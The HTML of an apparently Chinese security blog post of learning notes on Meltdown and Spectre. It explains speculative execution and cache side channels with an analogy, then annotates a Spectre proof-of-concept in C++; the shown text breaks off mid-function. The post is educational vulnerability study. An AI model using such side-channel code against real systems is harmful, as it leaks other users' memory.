@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="最近Meltdown和Spectre两个漏洞在各大安全媒体刷屏，堪称年初大戏。本来想好好研究一下这两个漏洞的原理，无奈业界各位大牛各种分析，深感自己写的不如他们通俗易懂。故这篇文章，大部分内容不是自己的研究成果，而是阅读各位大牛漏洞分析文章的一个总结笔记。有些段是原封不动的，若有侵权嫌疑，请联系我。 0x01漏洞原理1.1CPU缓存验证缺陷分支预测和乱序执行，是一种CPU优化技术，CPU会执行一些">
+<meta name="keywords" content="漏洞复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Meltdown和Spectre漏洞学习笔记">
+<meta property="og:url" content="http://gv7.me/articles/2018/learning-notes-of-meltdown-and-spectre/index.html">
+<meta property="og:site_name" content="回忆飘如雪">
+<meta property="og:description" content="最近Meltdown和Spectre两个漏洞在各大安全媒体刷屏，堪称年初大戏。本来想好好研究一下这两个漏洞的原理，无奈业界各位大牛各种分析，深感自己写的不如他们通俗易懂。故这篇文章，大部分内容不是自己的研究成果，而是阅读各位大牛漏洞分析文章的一个总结笔记。有些段是原封不动的，若有侵权嫌疑，请联系我。 0x01漏洞原理1.1CPU缓存验证缺陷分支预测和乱序执行，是一种CPU优化技术，CPU会执行一些">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://gv7.me/articles/2018/learning-notes-of-meltdown-and-spectre/001.jpg">
+<meta property="og:image" content="http://gv7.me/articles/2018/learning-notes-of-meltdown-and-spectre/002.jpg">
+<meta property="og:image" content="http://gv7.me/articles/2018/learning-notes-of-meltdown-and-spectre/003.jpg">
+<meta property="og:image" content="http://gv7.me/articles/2018/learning-notes-of-meltdown-and-spectre/004.png">
+<meta property="og:image" content="http://gv7.me/articles/2018/learning-notes-of-meltdown-and-spectre/Windows_poc.png">
+<meta property="og:image" content="http://gv7.me/articles/2018/learning-notes-of-meltdown-and-spectre/Linux_poc.gif">
+<meta property="og:image" content="http://gv7.me/articles/2018/learning-notes-of-meltdown-and-spectre/PowerShell_error.png">
+<meta property="og:image" content="http://gv7.me/articles/2018/learning-notes-of-meltdown-and-spectre/PowerShell_check.png">
+<meta property="og:image" content="http://gv7.me/articles/2018/learning-notes-of-meltdown-and-spectre/am_i_affected_by_meltdown.png">
+<meta property="og:updated_time" content="2019-02-16T18:05:32.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Meltdown和Spectre漏洞学习笔记">
+<meta name="twitter:description" content="最近Meltdown和Spectre两个漏洞在各大安全媒体刷屏，堪称年初大戏。本来想好好研究一下这两个漏洞的原理，无奈业界各位大牛各种分析，深感自己写的不如他们通俗易懂。故这篇文章，大部分内容不是自己的研究成果，而是阅读各位大牛漏洞分析文章的一个总结笔记。有些段是原封不动的，若有侵权嫌疑，请联系我。 0x01漏洞原理1.1CPU缓存验证缺陷分支预测和乱序执行，是一种CPU优化技术，CPU会执行一些">
+<meta name="twitter:image" content="http://gv7.me/articles/2018/learning-notes-of-meltdown-and-spectre/001.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>
+		
+			Meltdown和Spectre漏洞学习笔记 | 回忆飘如雪
+		
+	</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="https://github.com/c0ny1/">项目</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+         
+          <li><a href="/gossip">闲言碎语</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/articles/2018/pentestbox-search-tools/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/articles/2017/jsEncrypter/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://gv7.me/articles/2018/learning-notes-of-meltdown-and-spectre/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://gv7.me/articles/2018/learning-notes-of-meltdown-and-spectre/&text=Meltdown和Spectre漏洞学习笔记"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://gv7.me/articles/2018/learning-notes-of-meltdown-and-spectre/&title=Meltdown和Spectre漏洞学习笔记"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://gv7.me/articles/2018/learning-notes-of-meltdown-and-spectre/&is_video=false&description=Meltdown和Spectre漏洞学习笔记"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Meltdown和Spectre漏洞学习笔记&body=Check out this article: http://gv7.me/articles/2018/learning-notes-of-meltdown-and-spectre/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://gv7.me/articles/2018/learning-notes-of-meltdown-and-spectre/&title=Meltdown和Spectre漏洞学习笔记"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://gv7.me/articles/2018/learning-notes-of-meltdown-and-spectre/&title=Meltdown和Spectre漏洞学习笔记"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://gv7.me/articles/2018/learning-notes-of-meltdown-and-spectre/&title=Meltdown和Spectre漏洞学习笔记"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://gv7.me/articles/2018/learning-notes-of-meltdown-and-spectre/&title=Meltdown和Spectre漏洞学习笔记"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://gv7.me/articles/2018/learning-notes-of-meltdown-and-spectre/&name=Meltdown和Spectre漏洞学习笔记&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01漏洞原理"><span class="toc-number">1.</span> <span class="toc-text">0x01漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1CPU缓存验证缺陷"><span class="toc-number">1.0.1.</span> <span class="toc-text">1.1CPU缓存验证缺陷</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2边信道攻击缓存"><span class="toc-number">1.0.2.</span> <span class="toc-text">1.2边信道攻击缓存</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3通俗理解"><span class="toc-number">1.0.3.</span> <span class="toc-text">1.3通俗理解</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02漏洞复现"><span class="toc-number">2.</span> <span class="toc-text">0x02漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1poc代码注释"><span class="toc-number">2.0.1.</span> <span class="toc-text">2.1poc代码注释</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2Window平台测试："><span class="toc-number">2.0.2.</span> <span class="toc-text">2.2Window平台测试：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3Linux平台测试："><span class="toc-number">2.0.3.</span> <span class="toc-text">2.3Linux平台测试：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4其他poc汇总"><span class="toc-number">2.0.4.</span> <span class="toc-text">2.4其他poc汇总</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03漏洞检测"><span class="toc-number">3.</span> <span class="toc-text">0x03漏洞检测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1Windows平台"><span class="toc-number">3.0.1.</span> <span class="toc-text">3.1Windows平台</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#3-1-1方法一"><span class="toc-number">3.0.1.1.</span> <span class="toc-text">3.1.1方法一</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#（1）安装PowerShell模块"><span class="toc-number">3.0.1.1.1.</span> <span class="toc-text">（1）安装PowerShell模块</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#（2）运行验证模块"><span class="toc-number">3.0.1.1.2.</span> <span class="toc-text">（2）运行验证模块</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-1-2方法二"><span class="toc-number">3.0.1.2.</span> <span class="toc-text">3.1.2方法二</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#（1）下载并解压好脚本"><span class="toc-number">3.0.1.2.1.</span> <span class="toc-text">（1）下载并解压好脚本</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#（2）导入并执行验证模块"><span class="toc-number">3.0.1.2.2.</span> <span class="toc-text">（2）导入并执行验证模块</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2Linux平台"><span class="toc-number">3.0.2.</span> <span class="toc-text">3.2Linux平台</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04漏洞修复"><span class="toc-number">4.</span> <span class="toc-text">0x04漏洞修复</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1Windows操作系统（7-8-10）和Microsoft-Edge-IE"><span class="toc-number">4.0.1.</span> <span class="toc-text">4.1Windows操作系统（7/8/10）和Microsoft Edge/IE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2火狐浏览器"><span class="toc-number">4.0.2.</span> <span class="toc-text">4.2火狐浏览器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3Google-Chrome浏览器"><span class="toc-number">4.0.3.</span> <span class="toc-text">4.3Google Chrome浏览器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-4Linux"><span class="toc-number">4.0.4.</span> <span class="toc-text">4.4Linux</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-5VMware"><span class="toc-number">4.0.5.</span> <span class="toc-text">4.5VMware</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05参考资料"><span class="toc-number">5.</span> <span class="toc-text">0x05参考资料</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Meltdown和Spectre漏洞学习笔记
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">c0ny1</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-01-09T08:24:37.000Z" itemprop="datePublished">2018-01-09</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/漏洞复现/">漏洞复现</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>最近Meltdown和Spectre两个漏洞在各大安全媒体刷屏，堪称年初大戏。本来想好好研究一下这两个漏洞的原理，无奈业界各位大牛各种分析，深感自己写的不如他们通俗易懂。故这篇文章，大部分内容不是自己的研究成果，而是阅读各位大牛漏洞分析文章的一个总结笔记。有些段是原封不动的，若有侵权嫌疑，请联系我。</p>
+<h2 id="0x01漏洞原理"><a href="#0x01漏洞原理" class="headerlink" title="0x01漏洞原理"></a>0x01漏洞原理</h2><h4 id="1-1CPU缓存验证缺陷"><a href="#1-1CPU缓存验证缺陷" class="headerlink" title="1.1CPU缓存验证缺陷"></a>1.1CPU缓存验证缺陷</h4><p>分支预测和乱序执行，是一种CPU优化技术，CPU会执行一些可能在将来会执行的任务。当分支指令发出之后，无相关优化技术的处理器，在未收到正确的反馈信息之前，是不会做任何处理；而具有优化技术能力的新型处理器，可以预测即将执行的指令，会预先处理一些指令所需的数据，例如将下一条指令所需要访问的内存提前加载到CPU缓存中，这就避免了执行具体指令时再去读内存，从而加快了CPU的执行速度，具体流程如下所示：</p>
+<p><img src="/articles/2018/learning-notes-of-meltdown-and-spectre/001.jpg" alt="CPU 优化执行"></p>
+<p>指令3如果出现问题（如指令3是一个除0或者是一个非法的操作），会触发CPU的异常处理，具体情况如下</p>
+<p><img src="/articles/2018/learning-notes-of-meltdown-and-spectre/002.jpg" alt="CPU异常指令执行"></p>
+<p>对于具有预测执行能力的新型处理器，在实际CPU执行过程中，指令4所需的内存加载环节不依赖于指令3是否能够正常执行，而且从内存到缓存加载这个环节不会验证访问的内存是否合法有效。即使指令3出现异常，指令4无法执行，但指令4所需的内存数据已加载到CPU缓存中，这一结果导致指令4即使加载的是无权限访问的内存数据，该内存数据也会加载到CPU缓存中，因为CPU是在缓存到寄存器这个环节才去检测地址是否合法，而CPU分支预测仅仅是完成内存到CPU缓存的加载，实际指令4并没有被真正的执行，所以他的非法访问是不会触发异常的。</p>
+<p><img src="/articles/2018/learning-notes-of-meltdown-and-spectre/003.jpg" alt="CPU数据访问权限和地址合法性检查"></p>
+<p>如上图所示CPU缓存的这个过程对于用户是不可访问的，只有将具体的数据放到CPU的寄存器中用户才可操作，同时用户态程序也没有权限访问内核内存中的数据，因此CPU采用这种逻辑是没有问题的，但是如果有方法可以让我们得到CPU缓存中的数据，那么这种逻辑就存在缺陷。</p>
+<h4 id="1-2边信道攻击缓存"><a href="#1-2边信道攻击缓存" class="headerlink" title="1.2边信道攻击缓存"></a>1.2边信道攻击缓存</h4><p>CPU缓存通常在较小和较快的内部存储中缓存常用数据，从而隐藏慢速内存访问的延迟，缓存侧信道攻击正是利用CPU缓存与系统内存的读取的时间差异，从而变相猜测出CPU缓存中的数据，结合前边的缓存缺陷部分内容，产生如下的结果：</p>
+<p><img src="/articles/2018/learning-notes-of-meltdown-and-spectre/004.png" alt="漏洞原理图"></p>
+<p><em>注：简单来说，就是CPU缓存中的数据，在用户态和内核态都是无法正常访问的，除非当CPU缓存中的数据保存到寄存器中时，会被正常的读取；除此之外，是可以通过边信道的方式读取CPU的缓存的。<br>基于如上介绍的漏洞原理信息，通过CPU缓存验证缺陷，并利用边信道攻击技术可猜测CPU缓存中的数据，继而访问主机的完整内存数据，造成用户敏感信息泄露。</em></p>
+<h4 id="1-3通俗理解"><a href="#1-3通俗理解" class="headerlink" title="1.3通俗理解"></a>1.3通俗理解</h4><p>生活实例：新生入学报道（为简化问题，假设今天只有你一个人去学校报道，并且学校工作人员都是250）</p>
+<p>开学去学校报道，三个步骤（三条CPU指令）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1）凭借录取通知书去领学号</span><br><span class="line">2）凭借领取到的学号去领寝室号</span><br><span class="line">3）凭借领取到的寝室号去领寝室钥匙</span><br></pre></td></tr></table></figure>
+
+<p>开学了，你捡到一张录取通知书，通知书编号是1001，然后去拿着它去学校报道，报道工作处有三个工作人员甲乙丙。甲负责直接和你交互，甲拿到你的入学通知书后开始查找你的学号，然后填写表格，然后把学号给你</p>
+<p>与此同时，工作人员乙拿到甲查到的学号后，去表格中查你对应的寝室号，等甲办完以后直接交给你。</p>
+<p>还是与此同时，工作人员丙拿到乙查到的寝室号后开始去库房的钥匙柜架取出你的钥匙放在办公桌（同时，为了避免等会又跑一趟，它把这栋楼这一层的钥匙盒直接拿到办公室了，等会就不用再去库房奔波了），等乙办完以后就交给你。</p>
+<p>但是，这个时候，甲发现你身份有问题，这不是你的录取通知书，不能给你办理入学手续，不能把学号给你。于是你被打回。</p>
+<p>可是：乙已经提前帮你把对应学号的寝室号取到了（只是还没给你），丙也已经提前帮你把对应寝室的钥匙给你拿到了（只是还没给你）</p>
+<p>好，你被拒绝办理入学了，因为你是假冒的</p>
+<p>实际上，你已经是在校生了，不是大一新生，刚才你是故意去假冒大一新生去报道。<br>这个时候，你去丙的办公室借钥匙。往常丙都是说你等一下，我去给你拿，然后会等差不多五分钟，丙给你拿来钥匙。但今天不同的是，今天没有等那么久，而是直接就把钥匙取出来了给你，全程不超过10秒钟。</p>
+<p>于是，你明白了，一定是我刚才假冒去甲办理入学的时候，丙把钥匙盒取过来的，于是你意识到：我开始捡到的1001号的录取通知书新生住在我们这栋楼这一层。</p>
+<p>于是，你如法炮制，伪造1002,1003,1999···号录取通知书去报道，然后知道了他们每个人住在哪一栋那一层。</p>
+<h2 id="0x02漏洞复现"><a href="#0x02漏洞复现" class="headerlink" title="0x02漏洞复现"></a>0x02漏洞复现</h2><p>漏洞论文后给了一个POC，我们用他来复现。</p>
+<p>它的github地址为：<code>https://github.com/Eugnis/spectre-attack</code></p>
+<h4 id="2-1poc代码注释"><a href="#2-1poc代码注释" class="headerlink" title="2.1poc代码注释"></a>2.1poc代码注释</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    modify by:CSZQ</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*配置*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __DEBUG 0 <span class="comment">// 调试模式开关，会打开额外输出</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __TRYTIMES 50 <span class="comment">// 每个字符尝试读取次数</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*测试读取的数据*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __MAGICWORDS   <span class="meta-string">"1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890"</span>     </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __MAGICWORDSCOUNT (sizeof(__MAGICWORDS) - 1) <span class="comment">// 测试数据长度</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    cache 命中阀值，是一个经验值，不成功9.9可能这里不对，默认值 50 ，可以通过 -t 传参修改</span></span><br><span class="line"><span class="comment">    该数值与内存质量、CPU多项参数有关，是一个经验值，下面给出一些基于本帅移动端的 CPU Intel I7-4700MQ 给出的参数取值</span></span><br><span class="line"><span class="comment">    取值大致范围：16 - 176</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CACHE_HIT_THRESHOLD (50)</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/*头文件*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> optimize(<span class="meta-string">"gt"</span>,on)</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/*全局变量*/</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> array1_size = <span class="number">16</span>; <span class="comment">// 排除 ASCII 码表前 16 个字符</span></span><br><span class="line"><span class="keyword">uint8_t</span> array1[<span class="number">160</span>]      = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span> &#125;; <span class="comment">// 一个字典</span></span><br><span class="line"><span class="keyword">uint8_t</span> array2[<span class="number">256</span> * <span class="number">512</span>]; <span class="comment">// 256 对应 ASCII 码表</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *secret = __MAGICWORDS; <span class="comment">// 测试读取的数据</span></span><br><span class="line"><span class="keyword">int</span> iThreshold = CACHE_HIT_THRESHOLD; <span class="comment">// 读取时间阀值</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/*使用 temp 全局变量阻止编译器优化 victim_function()*/</span></span><br><span class="line"><span class="keyword">uint8_t</span> temp = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">victim_function</span><span class="params">(<span class="keyword">size_t</span> x)</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        x 取值 0 - 15 时 获取 arrary2 的 1 - 16 分组 &amp; temp 后赋值给 temp</span></span><br><span class="line"><span class="comment">        temp 一直为 0</span></span><br><span class="line"><span class="comment">        发生 evil 分支预测：</span></span><br><span class="line"><span class="comment">        array1[x] 在 5 次分支预测时加载的值就是当前需要读取的虚拟地址</span></span><br><span class="line"><span class="comment">        array2[array1[x] * 512] 在 5 次分支预测期间读取的是 标准ASCII 0 - 127 * 512 所在地址的 array2 数组内容</span></span><br><span class="line"><span class="comment">        其他分支预测：</span></span><br><span class="line"><span class="comment">        array1[x] cache 中的是根据尝试次数获取到的正常 array1 数组标准值</span></span><br><span class="line"><span class="comment">        array2[array1[x] * 512] 在cache中缓存的是 ASCII 码表 1 - 16 号字符</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (x &lt; array1_size) &#123;</span><br><span class="line">        temp &amp;= array2[array1[x] * <span class="number">512</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readMemoryByte</span><span class="params">(<span class="keyword">size_t</span> malicious_x, <span class="keyword">uint8_t</span> value[<span class="number">2</span>], <span class="keyword">int</span> score[<span class="number">2</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> results[<span class="number">256</span>];                                          <span class="comment">// 对应 